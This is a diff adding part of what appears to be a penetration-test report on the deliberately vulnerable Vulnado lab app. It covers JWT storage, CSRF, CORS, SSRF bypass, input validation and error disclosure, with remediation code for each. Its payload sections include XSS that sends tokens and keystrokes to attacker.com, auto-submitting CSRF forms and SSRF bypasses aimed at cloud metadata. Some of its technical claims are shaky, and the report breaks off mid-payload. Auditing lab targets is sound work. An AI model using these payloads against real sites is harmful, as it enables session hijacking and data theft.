+    xhr.setRequestHeader('x-auth-token', localStorage.jwt);  // Accessible to XSS
+  }
+});
+```
+
+### Impact
+
+- **XSS Token Theft:** Via Stored XSS in comments, attacker steals token
+- **Session Hijacking:** Attacker uses stolen token for unauthorized access
+- **Credential Exposure:** Username stored plaintext in localStorage
+- **Persistent Compromise:** Token remains until manual logout
+- **Automatic Exploitation:** Every page load automatically includes token
+
+### Mitigation
+
+1. **Use HTTPOnly Cookies:** Server sets token in httpOnly, Secure, SameSite cookie
+2. **Avoid localStorage:** Never store sensitive data in localStorage
+3. **Implement Content Security Policy:** Prevent inline scripts
+4. **Use Anti-CSRF Tokens:** Additional protection for state-changing operations
+5. **Short-lived Tokens:** Expire tokens quickly (15-30 minutes)
+6. **Refresh Token Rotation:** Use separate refresh tokens with longer expiry
+
+**Remediation Code:**
+
+```java
+// Backend: Set cookie instead of returning token
+@PostMapping("/login")
+public void login(@RequestBody LoginRequest input, 
+                  HttpServletResponse response) {
+  User user = User.fetch(input.username);
+  if (Postgres.bcrypt(input.password).equals(user.hashedPassword)) {
+    String token = user.token(secret);
+    
+    // Set secure cookie
+    Cookie cookie = new Cookie("auth_token", token);
+    cookie.setHttpOnly(true);      // Not accessible via JavaScript
+    cookie.setSecure(true);        // HTTPS only
+    cookie.setPath("/");
+    cookie.setMaxAge(900);         // 15 minutes
+    cookie.setAttribute("SameSite", "Strict");
+    
+    response.addCookie(cookie);
+    response.setStatus(HttpServletResponse.SC_OK);
+  } else {
+    response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
+  }
+}
+
+// Application config
+@Configuration
+public class SecurityConfig {
+  @Bean
+  public CookieSerializer cookieSerializer() {
+    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
+    serializer.setUseHttpOnlyCookie(true);
+    serializer.setUseBase64Encoding(false);
+    serializer.setCookiePath("/");
+    serializer.setCookieMaxAge(900);
+    return serializer;
+  }
+}
+```
+
+**JavaScript Remediation:**
+
+```javascript
+// Frontend: Remove localStorage, rely on automat cookie sending
+$(document).ready(function(){
+  // No longer storing JWT in localStorage
+  // Browser automatically sends cookie with requests
+  
+  $.get("http://localhost:8080/comments", function(data){
+    // Token sent automatically via cookie
+    processComments(data);
+  });
+});
+```
+
+### Steps to Reproduce
+
+1. Log into application
+2. Open browser Developer Tools (F12)
+3. Navigate to Application → LocalStorage
+4. Observe JWT token and username stored plaintext
+5. Copy JWT token
+6. Use in curl/Postman to access protected endpoints
+7. Or inject XSS to automatically exfiltrate token
+
+### Injection Point
+
+**Storage Location:** Browser LocalStorage  
+**Keys:** `jwt`, `username`  
+**Accessibility:** Any JavaScript on page domain  
+**Access Method:** `localStorage.getItem('jwt')`
+
+### Full Payload
+
+**Payload 1: Direct LocalStorage access (from DevTools)**
+```javascript
+// In browser console
+localStorage.getItem('jwt')  // Returns: eyJhbGciOiJIUzI1NiJ9...
+localStorage.getItem('username')  // Returns: "alice"
+```
+
+**Payload 2: XSS-based credential theft**
+```javascript
+// Injected via stored XSS comment
+fetch('http://attacker.com/steal', {
+  method: 'POST',
+  body: JSON.stringify({
+    jwt: localStorage.getItem('jwt'),
+    username: localStorage.getItem('username'),
+    cookies: document.cookie,
+    userAgent: navigator.userAgent
+  })
+});
+```
+
+**Payload 3: Malicious comment with token harvester**
+```json
+{
+  "username": "hacker",
+  "body": "<img src=x onerror=\"var t=localStorage.getItem('jwt');fetch('http://attacker.com/log?token='+encodeURIComponent(t))\">"
+}
+```
+
+**Payload 4: Token reuse via cURL**
+```bash
+# Copy JWT from localStorage
+TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.DRu..."
+
+# Use to access private endpoints
+curl -H "x-auth-token: $TOKEN" http://localhost:8080/comments
+curl -H "x-auth-token: $TOKEN" http://localhost:8080/comments/123 -X DELETE
+```
+
+**Payload 5: Keylogger to capture login credentials**
+```javascript
+// Injected via XSS
+document.addEventListener('keypress', function(event) {
+  fetch('http://attacker.com/log', {
+    method: 'POST',
+    body: 'key:' + String.fromCharCode(event.which) + 
+          '|location:' + window.location.pathname
+  });
+});
+```
+
+**Expected Result:** Token and credentials exposed to attacker
+
+---
+
+## 8. MISSING CSRF PROTECTION
+
+**Title:** No Cross-Site Request Forgery Token Protection  
+**CVSS Score:** 6.5 (Medium)  
+**CWE:** CWE-352  
+**OWASP:** A01:2021 – Broken Access Control  
+
+### Description
+
+The application does not implement CSRF tokens on state-changing requests (POST, PUT, DELETE). Combined with `@CrossOrigin(origins = "*")`, attackers can forge requests from other domains.
+
+**Vulnerable Code Locations:**
+- `src/main/java/com/scalesec/vulnado/LoginController.java` (Line 16)
+- `src/main/java/com/scalesec/vulnado/CommentsController.java` (Line 14, 21, 27)
+
+```java
+@CrossOrigin(origins = "*")  // Allows any origin
+@RequestMapping(value = "/login", method = RequestMethod.POST, ...)
+LoginResponse login(@RequestBody LoginRequest input) {
+  // No CSRF token validation!
+}
+
+@CrossOrigin(origins = "*")  // Allows any origin
+@RequestMapping(value = "/comments", method = RequestMethod.POST, ...)
+Comment createComment(@RequestHeader(value="x-auth-token") String token, 
+                     @RequestBody CommentRequest input) {
+  // No CSRF token validation!
+}
+```
+
+### Impact
+
+- **Malicious Comment Posting:** Attacker posts on behalf of authenticated user
+- **Account Actions:** Delete comments, modify profile
+- **Email Verification Bypass:** Change email on user account
+- **Financial Transactions:** If application handles payments
+- **Defacement:** Comments section filled with attacker content
+- **Reputation Damage:** User accounts appear to perform malicious actions
+
+### Mitigation
+
+1. **Implement CSRF Tokens:** Double-submit pattern or synchronizer token
+2. **Set SameSite Cookies:** Prevent automatic cookie inclusion in cross-site requests
+3. **Remove @CrossOrigin(*):** Restrict to specific trusted domains
+4. **Validate Origin Header:** Ensure request from legitimate source
+5. **Use State-Safe Methods:** GET for retrieval, POST/DELETE for modifications
+
+**Remediation Code:**
+
+```java
+// Spring Security CSRF configuration
+@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+  
+  @Override
+  protected void configure(HttpSecurity http) throws Exception {
+    http
+      .csrf()  // Enable CSRF protection (default in Spring Security)
+        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+      .and()
+      .authorizeRequests()
+        .antMatchers("/login").permitAll()
+        .anyRequest().authenticated()
+      .and()
+      .cors()  // Configure CORS properly
+        .configurationSource(corsConfigurationSource());
+  }
+  
+  @Bean
+  public CorsConfigurationSource corsConfigurationSource() {
+    CorsConfiguration configuration = new CorsConfiguration();
+    configuration.setAllowedOrigins(Arrays.asList("https://trusted-domain.com"));
+    configuration.setAllowedMethods(Arrays.asList("GET", "POST", "DELETE"));
+    configuration.setAllowedHeaders(Arrays.asList("*"));
+    configuration.setAllowCredentials(true);
+    
+    UrlBasedCorsConfigurationSource source = 
+      new UrlBasedCorsConfigurationSource();
+    source.registerCorsConfiguration("/**", configuration);
+    return source;
+  }
+}
+
+// Frontend: Include CSRF token
+@RestController
+public class CsrfController {
+  @GetMapping("/csrf-token")
+  public CsrfToken csrfToken(CsrfToken token) {
+    return token;
+  }
+}
+```
+
+**JavaScript Remediation:**
+
+```javascript
+// Get CSRF token
+$.get("/csrf-token", function(csrfToken) {
+  $.ajaxSetup({
+    headers: {
+      'X-CSRF-TOKEN': csrfToken.token
+    }
+  });
+});
+
+// Post with CSRF token
+$('#submit-comment').click(function(){
+  $.ajax({
+    type: "POST",
+    url: "/comments",
+    data: JSON.stringify({username: username, body: comment}),
+    contentType: "application/json",
+    headers: {
+      'X-CSRF-TOKEN': $('meta[name="_csrf"]').attr('content')
+    }
+  });
+});
+```
+
+### Steps to Reproduce
+
+1. Create attacker website with hidden form
+2. Lure authenticated user to visit site
+3. JavaScript automatically submits form to Vulnado
+4. Request includes user's authentication cookies
+5. Comment posted on behalf of user without their knowledge
+
+### Injection Point
+
+**State-changing Endpoints:**
+- POST `/login`
+- POST `/comments`
+- DELETE `/comments/{id}`
+- POST `/cowsay` (if state-changing)
+
+**Attack Vector:** Cross-site form submission  
+**Authentication:** User cookies automatically included  
+**Validation:** No CSRF token checked
+
+### Full Payload
+
+**Payload 1: HTML form on attacker site**
+```html
+<!-- Located on attacker-domain.com -->
+<html>
+<body>
+  <form action="http://localhost:8080/comments" method="POST">
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="body" value="Check out my site: http://attacker.com/malware"/>
+    <input type="submit" value="Click here to win a prize!"/>
+  </form>
+  <script>
+    document.forms[0].submit();  // Auto-submit without user clicking
+  </script>
+</body>
+</html>
+```
+
+**Payload 2: CSRF attack with AJAX**
+```html
+<html>
+<body>
+  <script>
+    // If admin visits malicious page while logged in
+    const token = localStorage.getItem('jwt');  // Get from localStorage
+    fetch('http://localhost:8080/comments/admin-secret-id', {
+      method: 'DELETE',
+      headers: {
+        'x-auth-token': token,
+        'Content-Type': 'application/json'
+      }
+    });
+  </script>
+</body>
+</html>
+```
+
+**Payload 3: Image tag CSRF (GET request)**
+```html
+<!-- Auto-loads when user visits page -->
+<img src="http://localhost:8080/cowsay?input=hacked" style="display:none">
+```
+
+**Payload 4: Embedded iframe CSRF**
+```html
+<iframe name="csrf-frame" style="display:none"></iframe>
+<form target="csrf-frame" action="http://localhost:8080/comments" method="POST">
+  <input type="hidden" name="username" value="attacker"/>
+  <input type="hidden" name="body" value="HACKED"/>
+  <input type="submit" value="win"/>
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+**cURL Example (if using cookies):**
+```bash
+# Simulate from different domain
+curl -b "session_cookie=abc123" -X POST \
+  -H 'Content-Type: application/json' \
+  -H 'Origin: http://attacker-domain.com' \
+  -d '{"username":"attacker","body":"CSRF Attack"}' \
+  'http://localhost:8080/comments'
+```
+
+**Expected Result:** Comments posted, actions performed without user's explicit consent
+
+---
+
+## 9. SECURITY MISCONFIGURATION
+
+**Title:** Overly Permissive CORS and Missing Security Headers  
+**CVSS Score:** 6.0 (Medium)  
+**CWE:** CWE-16  
+**OWASP:** A05:2021 – Security Misconfiguration  
+
+### Description
+
+The application uses `@CrossOrigin(origins = "*")` on all endpoints, allowing requests from any domain. Combined with missing security headers, this enables multiple attack vectors.
+
+**Vulnerable Code Locations:**
+- `src/main/java/com/scalesec/vulnado/LoginController.java`
+- `src/main/java/com/scalesec/vulnado/CommentsController.java`
+- `src/main/java/com/scalesec/vulnado/LinksController.java`
+
+```java
+@CrossOrigin(origins = "*")  // Critical misconfiguration
+@RequestMapping(value = "/login", method = RequestMethod.POST, ...)
+LoginResponse login(@RequestBody LoginRequest input) { ... }
+
+@CrossOrigin(origins = "*")  // Critical misconfiguration
+@RequestMapping(value = "/comments", method = RequestMethod.GET, ...)
+List<Comment> comments(@RequestHeader(value="x-auth-token") String token) { ... }
+```
+
+### Impact
+
+- **CSRF Attacks:** Requests from other domains accepted
+- **Clickjacking:** Site can be embedded in attacker iframe
+- **Cache Poisoning:** Responses cached improperly
+- **MIME Sniffing:** Browser interprets wrong content type
+- **XSS Escalation:** Less protection against XSS exploitation
+- **Information Disclosure:** Debug info exposed in responses
+
+### Mitigation
+
+1. **Restrict CORS:** Only allow specific trusted domains
+2. **Add Security Headers:** HSTS, X-Frame-Options, CSP, X-Content-Type-Options
+3. **Set Cookie Flags:** HTTPOnly, Secure, SameSite
+4. **Disable Debug Mode:** Remove stack traces from responses
+5. **Implement Rate Limiting:** Prevent abuse
+6. **Use HTTPS:** Enforce encrypted communication
+
+**Remediation Code:**
+
+```java
+@Configuration
+public class WebConfig implements WebMvcConfigurer {
+  
+  @Override
+  public void addCorsMappings(CorsRegistry registry) {
+    registry.addMapping("/**")
+      .allowedOrigins("https://trusted-domain.com")  // Specific domain only
+      .allowedMethods("GET", "POST", "DELETE")
+      .allowedHeaders("*")
+      .allowCredentials(true)
+      .maxAge(3600);
+  }
+}
+
+@Configuration
+public class SecurityHeadersConfig {
+  
+  @Bean
+  public WebSecurityCustomizer webSecurityCustomizer() {
+    return (web) -> {
+      // Configure security headers
+    };
+  }
+}
+
+// Add custom filter for security headers
+@Component
+public class SecurityHeadersFilter extends OncePerRequestFilter {
+  
+  @Override
+  protected void doFilterInternal(HttpServletRequest request,
+                                HttpServletResponse response,
+                                FilterChain filterChain)
+      throws ServletException, IOException {
+    
+    // Add security headers
+    response.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
+    response.setHeader("X-Content-Type-Options", "nosniff");
+    response.setHeader("X-Frame-Options", "DENY");
+    response.setHeader("X-XSS-Protection", "1; mode=block");
+    response.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'");
+    response.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
+    response.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
+    
+    filterChain.doFilter(request, response);
+  }
+}
+```
+
+### Steps to Reproduce
+
+1. Create attacker website
+2. Host HTML page that makes requests to Vulnado
+3. Open page while authenticated to Vulnado
+4. Requests succeed due to `@CrossOrigin(*)`
+5. Or embed Vulnado in iframe to test clickjacking
+6. Or check response headers for missing security headers
+
+### Injection Point
+
+**CORS Configuration:**
+- `origins = "*"` - Accepts all origins
+- `allowedMethods` - No restriction
+- `allowedHeaders` - All headers allowed
+- `allowCredentials` - Can include cookies
+
+**Security Headers Missing:**
+- Strict-Transport-Security (HSTS)
+- X-Frame-Options
+- Content-Security-Policy (CSP)
+- X-Content-Type-Options
+- X-XSS-Protection
+
+### Full Payload
+
+**Payload 1: Check CORS headers**
+```bash
+curl -H "Origin: http://attacker-domain.com" \
+     -H "Access-Control-Request-Method: POST" \
+     -H "Access-Control-Request-Headers: x-auth-token" \
+     -X OPTIONS \
+     -v http://localhost:8080/comments
+
+# Response shows: Access-Control-Allow-Origin: * (vulnerable)
+```
+
+**Payload 2: CORS-based data exfiltration**
+```html
+<html>
+<script>
+  fetch('http://localhost:8080/comments', {
+    headers: {'x-auth-token': 'stolen-token'}
+  })
+  .then(r => r.json())
+  .then(data => {
+    fetch('http://attacker.com/log?data=' + JSON.stringify(data));
+  });
+</script>
+</html>
+```
+
+**Payload 3: Clickjacking via iframe**
+```html
+<!-- Attacker site -->
+<html>
+<body>
+  <div style="background: url('http://transparent.png'); cursor: pointer;">
+    <iframe src="http://localhost:8080/comments" 
+            style="opacity: 0.1; position: absolute; width: 100%; height: 100%;">
+    </iframe>
+  </div>
+  Click here to claim your prize!
+</body>
+</html>
+```
+
+**Payload 4: Cache poisoning**
+```bash
+# Request with X-Original-URL
+curl 'http://localhost:8080/comments?x-original-url=http://attacker.com/malware' \
+     -H "Host: legitsite.com"
+```
+
+**Payload 5: Check missing security headers**
+```bash
+curl -i http://localhost:8080/comments
+
+# Check for missing headers:
+# - Strict-Transport-Security
+# - X-Frame-Options
+# - X-Content-Type-Options
+# - Content-Security-Policy
+```
+
+**Expected Result:** Cross-origin requests accepted, missing security headers expose to further attacks
+
+---
+
+## 10. SSRF BYPASS IN VERSION 2
+
+**Title:** Insufficient SSRF Protection - Bypass Possible  
+**CVSS Score:** 6.5 (Medium)  
+**CWE:** CWE-918  
+**OWASP:** A10:2021 – Server-Side Request Forgery  
+
+### Description
+
+The `/links-v2` endpoint attempts to block private IPs but uses incomplete validation. The blacklist checks only for certain IP ranges and can be bypassed using:
+- IPv6 addresses (::1, ::ffff:127.0.0.1)
+- Decimal IP encoding (2130706433 = 127.0.0.1)
+- DNS rebinding
+- Octal encoding (0177.0.0.1)
+- Hostname tricks (localhost.localdomain, 127.0.0.256)
+
+**Vulnerable Code Location:** `src/main/java/com/scalesec/vulnado/LinkLister.java` (Line 22-32)
+
+```java
+public static List<String> getLinksV2(String url) throws BadRequest {
+  try {
+    URL aUrl= new URL(url);
+    String host = aUrl.getHost();
+    System.out.println(host);
+    if (host.startsWith("172.") || host.startsWith("192.168") || host.startsWith("10.")){
+      throw new BadRequest("Use of Private IP");
+    } else {
+      return getLinks(url);  // Still vulnerable!
+    }
+  } catch(Exception e) {
+    throw new BadRequest(e.getMessage());
+  }
+}
+```
+
+### Impact
+
+- **Metadata Service Access:** AWS, Azure, GCP metadata still accessible
+- **Bypass Detection:** SSRF protections easily circumvented
+- **Internal Service Access:** Port scanning and enumeration still possible
+- **Limited Mitigation:** Attempts to fix but incomplete
+
+### Mitigation
+
+1. **Use Whitelist Approach:** Only allow specific domains (recommended)
+2. **Use InetAddress Canonicalization:** Resolve hostname to verify IP
+3. **Check All IP Ranges:** Loopback, link-local, multicast, reserved
+4. **Validate After Redirect:** Check final URL after redirects
+5. **DNS Rebinding Protection:** Time-based verification
+
+**Remediation Code:**
+
+```java
+public static List<String> getLinksV2(String url) throws BadRequest {
+  try {
+    // Whitelist of allowed domains
+    Set<String> ALLOWED_DOMAINS = new HashSet<>(
+      Arrays.asList("wikipedia.org", "github.com", "stackoverflow.com")
+    );
+    
+    URL aUrl = new URL(url);
+    String host = aUrl.getHost();
+    
+    // Resolve hostname to IP for verification
+    InetAddress addr = InetAddress.getByName(host);
+    String ipAddress = addr.getHostAddress();
+    
+    // Check if IP is private/reserved
+    if (isPrivateOrReservedIP(ipAddress)) {
+      throw new BadRequest("Private or reserved IP not allowed");
+    }
+    
+    // Whitelist check (recommended over blacklist)
+    if (!ALLOWED_DOMAINS.contains(host)) {
+      throw new BadRequest("Domain not whitelisted");
+    }
+    
+    // Only allow HTTP/HTTPS
+    String protocol = aUrl.getProtocol();
+    if (!protocol.matches("^https?$")) {
+      throw new BadRequest("Only HTTP/HTTPS allowed");
+    }
+    
+    return getLinks(url);
+  } catch (Exception e) {
+    throw new BadRequest(e.getMessage());
+  }
+}
+
+private static boolean isPrivateOrReservedIP(String ip) {
+  try {
+    InetAddress addr = InetAddress.getByName(ip);
+    return addr.isLoopbackAddress()
+        || addr.isLinkLocalAddress()
+        || addr.isSiteLocalAddress()
+        || addr.isMulticastAddress()
+        || addr.isAnyLocalAddress()
+        || ip.startsWith("0.")                    // 0.0.0.0/8
+        || ip.startsWith("10.")                   // 10.0.0.0/8
+        || ip.startsWith("127.")                  // 127.0.0.0/8
+        || ip.startsWith("169.254.")              // 169.254.0.0/16
+        || ip.startsWith("172.16.") 
+        || ip.startsWith("172.17.")
+        || ip.startsWith("172.18.")
+        || ip.startsWith("172.19.")
+        || ip.startsWith("172.20.")
+        || ip.startsWith("172.21.")
+        || ip.startsWith("172.22.")
+        || ip.startsWith("172.23.")
+        || ip.startsWith("172.24.")
+        || ip.startsWith("172.25.")
+        || ip.startsWith("172.26.")
+        || ip.startsWith("172.27.")
+        || ip.startsWith("172.28.")
+        || ip.startsWith("172.29.")
+        || ip.startsWith("172.30.")
+        || ip.startsWith("172.31.")              // 172.16.0.0/12
+        || ip.startsWith("192.168.")             // 192.168.0.0/16
+        || ip.startsWith("198.18.")
+        || ip.startsWith("198.19.");             // 198.18.0.0/15
+  } catch (Exception e) {
+    return false;
+  }
+}
+```
+
+### Steps to Reproduce
+
+1. Test `/links` endpoint (no protection)
+2. Test `/links-v2` endpoint with bypass techniques
+3. Observe internal service access despite "protection"
+4. Enumerate AWS metadata using bypass
+
+### Injection Point
+
+**Parameter:** `url` query parameter in GET request to `/links-v2`  
+**Request Method:** GET  
+**Authentication Required:** No  
+**Intended Protection:** IP range blacklist
+
+### Full Payload
+
+**Payload 1: IPv6 localhost**
+```
+GET /links-v2?url=http://[::1]:8080/
+GET /links-v2?url=http://[::ffff:127.0.0.1]:8080/
+```
+
+**Payload 2: Decimal IP encoding**
+```
+GET /links-v2?url=http://2130706433/  (127.0.0.1 in decimal)
+GET /links-v2?url=http://3232235776/  (192.168.0.0 in decimal)
+```
+
+**Payload 3: Octal encoding**
+```
+GET /links-v2?url=http://0177.0.0.1/
+GET /links-v2?url=http://0300.0.0.1/
+```
+
+**Payload 4: Hostname bypass**
+```
+GET /links-v2?url=http://localhost:8080/
+GET /links-v2?url=http://localhost.localdomain/
+GET /links-v2?url=http://127.0.0.1.nip.io/
+```
+
+**Payload 5: DNS rebinding**
+```
+# Setup DNS to resolve to 8.8.8.8 first, then 127.0.0.1
+GET /links-v2?url=http://attacker.com/  # Resolves to 127.0.0.1 on second lookup
+```
+
+**cURL Examples:**
+
+```bash
+# IPv6 bypass
+curl 'http://localhost:8080/links-v2?url=http://[::1]:8080/' | jq .
+
+# Decimal bypass
+curl 'http://localhost:8080/links-v2?url=http://2130706433/' | jq .
+
+# AWS metadata via bypass
+curl 'http://localhost:8080/links-v2?url=http://169.254.169.254.nip.io/latest/meta-data/' | jq .
+```
+
+**Expected Result:** Internal services/metadata accessed despite version 2 "protection"
+
+---
+
+## 11. INPUT VALIDATION GAPS
+
+**Title:** Missing or Insufficient Input Validation  
+**CVSS Score:** 5.0 (Medium)  
+**CWE:** CWE-20  
+**OWASP:** A03:2021 – Injection  
+
+### Description
+
+Various endpoints lack proper input validation:
+1. Comments have no length limits (max 500 in DB but no app validation)
+2. Cowsay accepts unlimited input without character whitelist
+3. Links endpoint accepts any string as URL
+4. Username accepts special characters
+5. No data type validation
+
+**Vulnerable Code Locations:**
+- `src/main/java/com/scalesec/vulnado/CommentsController.java`
+- `src/main/java/com/scalesec/vulnado/Cowsay.java`
+- `src/main/java/com/scalesec/vulnado/LinksController.java`
+
+### Impact
+
+- **Buffer Overflow:** Excessive input can crash application
+- **Database Injection:** Via length limits bypass
+- **Parsing Errors:** Malformed input causes unexpected behavior
+- **DoS:** Resource exhaustion with large inputs
+- **Logic Bypass:** Invalid data triggers unintended paths
+
+### Mitigation
+
+1. **Whitelist Approach:** Only allow known good characters
+2. **Length Limits:** Set reasonable max/min lengths
+3. **Type Validation:** Ensure correct data types
+4. **Pattern Matching:** Regex validation for formats
+5. **Sanitization:** Remove/escape special characters
+6. **Server-side Only:** Never rely on client-side validation
+
+**Remediation Code:**
+
+```java
+@RestController
+public class CommentsController {
+  
+  private static final int MAX_COMMENT_LENGTH = 500;
+  private static final int MIN_USERNAME_LENGTH = 1;
+  private static final int MAX_USERNAME_LENGTH = 50;
+  private static final Pattern USERNAME_PATTERN = 
+    Pattern.compile("^[a-zA-Z0-9_-]+$");
+  
+  @PostMapping("/comments")
+  public Comment createComment(
+      @RequestHeader(value="x-auth-token") String token, 
+      @RequestBody CommentRequest input) throws BadRequest {
+    
+    // Validate username
+    if (input.username == null || input.username.isEmpty()) {
+      throw new BadRequest("Username cannot be empty");
+    }
+    if (input.username.length() > MAX_USERNAME_LENGTH) {
+      throw new BadRequest("Username too long");
+    }
+    if (!USERNAME_PATTERN.matcher(input.username).matches()) {
+      throw new BadRequest("Invalid username characters");
+    }
+    
+    // Validate comment body
+    if (input.body == null || input.body.isEmpty()) {
+      throw new BadRequest("Comment cannot be empty");
+    }
+    if (input.body.length() > MAX_COMMENT_LENGTH) {
+      throw new BadRequest("Comment too long");
+    }
+    
+    // Additional security: check for injection attempts
+    if (containsSuspiciousPatterns(input.body)) {
+      throw new BadRequest("Comment contains suspicious patterns");
+    }
+    
+    return Comment.create(input.username, input.body);
+  }
+  
+  private boolean containsSuspiciousPatterns(String input) {
+    // Check for SQL injection keywords
+    String lowerInput = input.toLowerCase();
+    return lowerInput.contains("union ")
+        || lowerInput.contains("select ")
+        || lowerInput.contains("drop ")
+        || lowerInput.contains("delete ");
+  }
+}
+
+@RestController
+public class CowController {
+  
+  private static final int MAX_INPUT_LENGTH = 200;
+  private static final Pattern SAFE_CHARS = 
+    Pattern.compile("^[a-zA-Z0-9\\s!,.?-]*$");
+  
+  @GetMapping("/cowsay")
+  public String cowsay(
+      @RequestParam(defaultValue = "I love Linux!") String input) 
+      throws BadRequest {
+    
+    // Validate length
+    if (input.length() > MAX_INPUT_LENGTH) {
+      throw new BadRequest("Input too long");
+    }
+    
+    // Whitelist characters
+    if (!SAFE_CHARS.matcher(input).matches()) {
+      throw new BadRequest("Invalid characters in input");
+    }
+    
+    return Cowsay.run(input);
+  }
+}
+```
+
+### Steps to Reproduce
+
+1. Send request with extremely long comment (millions of characters)
+2. Send request with binary data
+3. Send request with null bytes
+4. Send request with special characters/encodings
+5. Observe lack of validation
+
+### Injection Point
+
+**Endpoints:**
+- `/comments` - POST (body field)
+- `/cowsay` - GET (input parameter)
+- `/links` - GET (url parameter)
+
+### Full Payload
+
+**Payload 1: Extremely long comment**
+```bash
+curl -X POST \
+  -H 'Content-Type: application/json' \
+  -H "x-auth-token: $TOKEN" \
+  -d '{"username":"alice","body":"'"$(python3 -c "print(\"A\"*100000)")"'"}' \
+  'http://localhost:8080/comments'
+```
+
+**Payload 2: Special characters in username**
+```json
+{
+  "username": "alice'; DROP TABLE users; --",
+  "body": "test comment"
+}
+```
+
+**Payload 3: Null bytes**
+```bash
+printf '{"username":"alice%00test","body":"comment"}' | \
+  curl -X POST \
+  -H 'Content-Type: application/json' \
+  -d @- \
+  'http://localhost:8080/comments'
+```
+
+**Payload 4: Unicode/encoding tricks**
+```bash
+curl -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"alice","body":"<SCRIPT>alert(1)</SCRIPT>"}' \
+  'http://localhost:8080/comments'
+
+# Try variations:
+# - <ScRiPt> (mixed case)
+# - &#60;script&#62; (HTML encoded)
+# - %3Cscript%3E (URL encoded)
+# - \u003Cscript\u003E (Unicode)
+```
+
+**Expected Result:** Input accepted without proper validation, potential bypass of security controls
+
+---
+
+## 12. INFORMATION DISCLOSURE
+
+**Title:** Sensitive Information Exposure in Error Messages  
+**CVSS Score:** 5.3 (Medium)  
+**CWE:** CWE-200  
+**OWASP:** A01:2021 – Broken Access Control  
+
+### Description
+
+The application exposes stack traces and detailed error messages to users, revealing:
+- File paths and code structure
+- Database connection strings
+- Internal IP addresses and service names
+- Software versions
+- Environment variables
+
+**Vulnerable Code Locations:** Various exception handlers
+
+```java
+} catch (Exception e) {
+  e.printStackTrace();  // Prints to stderr
+  System.err.println(e.getClass().getName()+": "+e.getMessage());  // Detailed error
+}
+```
+
+### Impact
+
+- **Information Gathering:** Attackers learn application architecture
+- **Version Detection:** Identify vulnerable software versions
+- **Path Disclosure:** Learn file system structure
+- **Credential Leakage:** Accidentally leaked in error messages
+- **Vulnerability Research:** Stack traces aid exploitation
+
+### Mitigation
+
+1. **Generic Error Messages:** Show user-friendly messages
+2. **Log Detailed Errors:** Send full details to server logs only
+3. **Error Codes:** Use error codes for support without leaking info
+4. **Disable Debug Mode:** In production
+5. **Remove Stack Traces:** From responses sent to client
+
+**Remediation Code:**
+
+```java
+@RestControllerAdvice
+public class GlobalExceptionHandler {
+  
+  private static final Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);
+  
+  @ExceptionHandler(Exception.class)
+  public ResponseEntity<?> handleException(Exception e, HttpServletRequest request) {
+    // Log full details server-side
+    logger.error("Error in request to " + request.getRequestURI(), e);
+    
+    // Return generic message to client
+    ErrorResponse errorResponse = new ErrorResponse();
+    errorResponse.setMessage("An error occurred processing your request");
+    errorResponse.setErrorCode("ERR_INTERNAL_SERVER_ERROR");
+    errorResponse.setStatusCode(HttpStatus.INTERNAL_SERVER_ERROR.value());
+    
+    // In development only
+    if (isProduction()) {
+      errorResponse.setDetails(null);  // No stack trace
+    } else {
+      errorResponse.setDetails(e.getMessage());
+    }
+    
+    return new ResponseEntity<>(errorResponse, HttpStatus.INTERNAL_SERVER_ERROR);
+  }
+  
+  private boolean isProduction() {
+    String env = System.getenv("APP_ENV");
+    return "production".equals(env);
+  }
+}
+
+// Better error logging
+@Component
+public class ErrorLoggingFilter extends OncePerRequestFilter {
+  
+  private static final Logger logger = LoggerFactory.getLogger(ErrorLoggingFilter.class);
+  
+  @Override
+  protected void doFilterInternal(HttpServletRequest request,
+                                HttpServletResponse response,
+                                FilterChain filterChain)
+      throws ServletException, IOException {
+    
+    try {
+      filterChain.doFilter(request, response);
+    } catch (Exception e) {
+      // Log detailed information
+      logger.error("Request failed: " + request.getMethod() + " " + request.getRequestURI(), e);
+      
+      // Send generic response
+      response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+      response.setContentType("application/json");
+      response.getWriter().write("{\"error\":\"Internal Server Error\"}");
+    }
+  }
+}
+```
+
+JavaScript error handling:
+
+```javascript
+// Never log sensitive data to console in production
+try {
+  // ... code
+} catch (error) {
+  // Development: full error
+  if (isDevelopment()) {
+    console.error(error);
+  }
+  // Production: generic message
+  console.log("An error occurred. Please try again.");
+  
+  // Send error report to backend
+  fetch('/api/errors', {
+    method: 'POST',
+    body: JSON.stringify({
+      message: error.message,
+      stack: error.stack,
+      url: window.location.href
+    })
+  });
+}
+```
+
+### Steps to Reproduce
+
+1. Trigger application error (invalid input, SQL error, etc.)
+2. Observe detailed error message returned
+3. Examine server logs or response headers
+4. Note exposed information (paths, versions, IPs)
+
+### Injection Point
+
+**All Endpoints** - Any request that causes error  
+**Response Headers** - Server version, framework info  
+**Error Messages** - Stack traces and details  
+**Logs** - Potentially exposed via misconfiguration
+
+### Full Payload
+
+**Payload 1: Trigger SQL error**
+```bash
+curl 'http://localhost:8080/links?url=invalid url with spaces'
+# Response may include: "java.net.malformedURLException"
+```
+
+**Payload 2: Trigger database error**
+```bash
+curl -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":null,"password":"test"}' \
+  'http://localhost:8080/login'
+# Response may include: "NullPointerException: username is null"
+```
+
+**Payload 3: Check server headers**
+```bash
+curl -i http://localhost:8080/comments
+
+# Observed headers:
+# Server: Apache Tomcat/9.0.31
+# X-Application-Type: Spring Boot
+```
+
+**Payload 4: File enumeration via error messages**
+```bash
+# Attempt to access files
+curl 'file:///etc/passwd' 
+# Error message may disclose: File not accessible: /app/src/...
+```
+
+**Payload 5: Version detection via stack trace**
+```bash
+# Trigger error
+curl 'http://localhost:8080/api/invalid'
+
+# Stack trace shows:
+# java.lang.NullPointerException
